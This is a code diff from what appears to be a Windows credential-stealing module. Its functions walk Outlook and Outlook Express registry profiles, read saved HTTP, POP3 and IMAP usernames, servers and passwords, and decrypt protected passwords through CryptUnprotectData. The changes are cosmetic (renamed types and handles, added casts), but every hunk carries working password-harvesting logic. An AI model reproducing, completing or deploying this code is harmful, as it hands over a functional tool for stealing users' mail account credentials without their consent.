@@ -28,7 +28,7 @@ typedef struct TOOUTDATA{
 OOUTDATA *OutlookData;
 DWORD oIndex;
 
-typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);
+typedef BOOL (WINAPI *CryptUnprotectData_t)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);
 
 
 // ----------------------- PSTORAGE OutlookExpress ------------------------
@@ -72,7 +72,7 @@ void dumpOutlook(const char *base_reg)
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTPMail Password2" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[2]));		
+				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) &(data[2]));		
 			}
 			OutlookData[oIndex].type = MAIL_HTTP;
 			// Ha trovato un utente, passa al successivo
@@ -90,7 +90,7 @@ void dumpOutlook(const char *base_reg)
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Password2" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[2]));
+				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) &(data[2]));
 			}
 			OutlookData[oIndex].type = MAIL_POP3;
 			// Ha trovato un utente, passa al successivo
@@ -108,7 +108,7 @@ void dumpOutlook(const char *base_reg)
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Password2" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[2]));
+				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) &(data[2]));
 			}
 			OutlookData[oIndex].type = MAIL_IMAP;
 			// Ha trovato un utente, passa al successivo
@@ -152,16 +152,16 @@ void DumpOutlookXP()
 
 		tmp_size = sizeof(data);
 		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"HTTP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Server URL" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[1]));		
+				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) &(data[1]));
 			}
 			OutlookData[oIndex].type = MAIL_HTTP;
 			// Ha trovato un utente, passa al successivo
@@ -170,16 +170,16 @@ void DumpOutlookXP()
 
 		tmp_size = sizeof(data);
 		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"POP3 User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[1]));
+				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) &(data[1]));
 			}
 			OutlookData[oIndex].type = MAIL_POP3;
 			// Ha trovato un utente, passa al successivo
@@ -188,16 +188,16 @@ void DumpOutlookXP()
 
 		tmp_size = sizeof(data);
 		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"IMAP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[1]));
+				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) &(data[1]));
 			}
 			OutlookData[oIndex].type = MAIL_IMAP;
 			// Ha trovato un utente, passa al successivo
@@ -326,7 +326,7 @@ void DumpPStorage()
 // -------------------- Outlook 2003 --------------------
 void DumpOutlook2003()
 {
-	HKEY hkeyresult, hkeyresult1;
+	HKEY hKeyRes, hKeyRes1;
 	char name[256],skey[400];
 	BYTE data[1024];
 	WCHAR server[100];
@@ -337,22 +337,22 @@ void DumpOutlook2003()
 	FILETIME f;
 
 	DATA_BLOB dbin, dbout;
-	typeCryptUnprotectData pfCryptUnprotectData = NULL;
+	CryptUnprotectData_t pfCryptUnprotectData = NULL;
 	HMODULE hCrypt32DLL = NULL; 
 
 	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  
-		pfCryptUnprotectData = (typeCryptUnprotectData)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
+		pfCryptUnprotectData = (CryptUnprotectData_t)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
 	
 	if (!pfCryptUnprotectData)
 		return;
 
 	FNC(lstrcpyA)(skey, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
-	if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, ( LPCTSTR )skey, 0, KEY_READ, &hkeyresult1 ) != ERROR_SUCCESS)
+	if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, ( LPCTSTR )skey, 0, KEY_READ, &hKeyRes1 ) != ERROR_SUCCESS)
 		return;
 
 	for (index=0;; index++) {
 		tmp_size = sizeof(name);
-		ret_val = FNC(RegEnumKeyExA)(hkeyresult1, index, name, &tmp_size, NULL, NULL, NULL, &f);
+		ret_val = FNC(RegEnumKeyExA)(hKeyRes1, index, name, &tmp_size, NULL, NULL, NULL, &f);
 		if (ret_val == ERROR_NO_MORE_ITEMS)
 			break;
 		if (ret_val != ERROR_SUCCESS)
@@ -361,20 +361,20 @@ void DumpOutlook2003()
 		FNC(lstrcpyA)(skey, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
 		FNC(lstrcatA)(skey,"\\");
 		FNC(lstrcatA)(skey, name);
-		if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, (LPCTSTR )skey, 0, KEY_READ, &hkeyresult ) != ERROR_SUCCESS)
+		if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, (LPCTSTR )skey, 0, KEY_READ, &hKeyRes ) != ERROR_SUCCESS)
 			continue;
 
 		tmp_size = sizeof(data);
-		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"HTTP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+		if(FNC(RegQueryValueExA) ( hKeyRes, (LPCTSTR)"HTTP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Server URL" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			if(FNC(RegQueryValueExA) ( hKeyRes, ( LPCTSTR )"HTTP Server URL" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			if(FNC(RegQueryValueExA) ( hKeyRes, ( LPCTSTR )"HTTP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 				dbin.cbData = tmp_size-1;
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
@@ -386,16 +386,16 @@ void DumpOutlook2003()
 		} 
 
 		tmp_size = sizeof(data);
-		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"POP3 User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+		if(FNC(RegQueryValueExA) ( hKeyRes, (LPCTSTR)"POP3 User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			if(FNC(RegQueryValueExA) ( hKeyRes, ( LPCTSTR )"POP3 Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			if(FNC(RegQueryValueExA) ( hKeyRes, ( LPCTSTR )"POP3 Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 				dbin.cbData = tmp_size-1;
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
@@ -407,16 +407,16 @@ void DumpOutlook2003()
 		} 
 
 		tmp_size = sizeof(data);
-		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCSTR)"IMAP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+		if(FNC(RegQueryValueExA) ( hKeyRes, (LPCSTR)"IMAP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) data);
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, (LPCSTR)"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			if(FNC(RegQueryValueExA) ( hKeyRes, (LPCSTR)"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, (LPCSTR) "IMAP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			if(FNC(RegQueryValueExA) ( hKeyRes, (LPCSTR) "IMAP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 				dbin.cbData = tmp_size-1;
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
@@ -427,10 +427,10 @@ void DumpOutlook2003()
 			}
 		} 
 
-		FNC(RegCloseKey)(hkeyresult);
+		FNC(RegCloseKey)(hKeyRes);
 	}
 
-	FNC(RegCloseKey)(hkeyresult1);
+	FNC(RegCloseKey)(hKeyRes1);
 }
 
 BOOL GetXMLNode(WCHAR *data, WCHAR *node, WCHAR *buffer)
@@ -455,11 +455,11 @@ BOOL XMLDecryptPassword(BYTE *password, BYTE *salt)
 	DATA_BLOB dbin, dbentropy, dbout;
 	DWORD i;
 	BYTE sum;
-	typeCryptUnprotectData pfCryptUnprotectData = NULL;
+	CryptUnprotectData_t pfCryptUnprotectData = NULL;
 	HMODULE hCrypt32DLL = NULL; 
 
 	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  
-		pfCryptUnprotectData = (typeCryptUnprotectData)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
+		pfCryptUnprotectData = (CryptUnprotectData_t)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
 	
 	if (!pfCryptUnprotectData)
 		return FALSE;
